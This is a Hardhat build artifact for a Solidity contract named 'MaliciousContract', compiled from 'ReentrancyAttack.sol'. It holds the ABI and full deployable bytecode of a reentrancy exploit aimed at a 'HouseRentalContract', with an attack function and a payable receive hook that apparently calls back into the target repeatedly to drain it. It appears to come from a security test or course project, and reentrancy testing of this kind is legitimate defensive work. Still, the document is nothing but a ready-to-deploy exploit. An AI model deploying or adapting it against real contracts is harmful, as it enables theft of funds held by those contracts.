{
  "_format": "hh-sol-artifact-1",
  "contractName": "MaliciousContract",
  "sourceName": "contracts/ReentrancyAttack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_targetAddress",
          "type": "address"
        },
        {
          "internalType": "bytes6",
          "name": "_targetContractId",
          "type": "bytes6"
        },
        {
          "internalType": "uint256",
          "name": "_targetRequestIndex",
          "type": "uint256"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "target",
      "outputs": [
        {
          "internalType": "contract HouseRentalContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "targetContractId",
      "outputs": [
        {
          "internalType": "bytes6",
          "name": "",
          "type": "bytes6"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "targetRequestIndex",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60803461009e57601f6102ef38819003918201601f19168301916001600160401b038311848410176100a35780849260609460405283398101031261009e5780516001600160a01b0381169081900361009e5760208201516001600160d01b031992909190838316830361009e5760400151926000549265ffffffffffff60a01b9060301c169216171760005560015560405161023590816100ba8239f35b600080fd5b634e487b7160e01b600052604160045260246000fdfe608060409080825260043610156100ab575b50361561001d57600080fd5b6000805491906001600160a01b038316670de0b6b3a76400008131101561004057005b60015493813b156100a757835163652961e160e11b815260309190911b6001600160d01b03191660048201526024810194909452819084908183816044810103925af191821561009d57505061009257005b61009b906101d5565b005b51903d90823e3d90fd5b8280fd5b600090813560e01c90816351720b41146101ad575080638788491d1461018e5780639e5faafc1461010b5763d4b8399203610011579034610107578160031936011261010757905490516001600160a01b039091168152602090f35b5080fd5b50908160031936011261010757815460015490919083906001600160a01b038416803b156100a757835163652961e160e11b815260309590951b6001600160d01b0319166004860152602485019190915283908183816044810103925af19081156101855750610179575080f35b610182906101d5565b80f35b513d84823e3d90fd5b5090346101075781600319360112610107576020906001549051908152f35b905034610107578160031936011261010757905460301b6001600160d01b0319168152602090f35b67ffffffffffffffff81116101e957604052565b634e487b7160e01b600052604160045260246000fdfea2646970667358221220866ea1f4e301cb1282e26e15d2a210668d9ec1f98df9785f645d48180a04343264736f6c63430008180033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}